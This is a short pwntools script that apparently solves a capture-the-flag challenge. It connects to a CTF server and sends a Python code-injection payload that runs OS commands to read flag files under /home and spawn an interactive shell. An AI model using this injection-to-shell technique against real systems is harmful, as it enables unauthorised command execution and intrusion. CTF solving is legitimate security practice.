from pwn import *

p = remote("icewall-ctf.kr", 24003)
p.sendline("__import__('os').system('cat /home/*/flag;sh')")
print p.recv()
p.interactive()
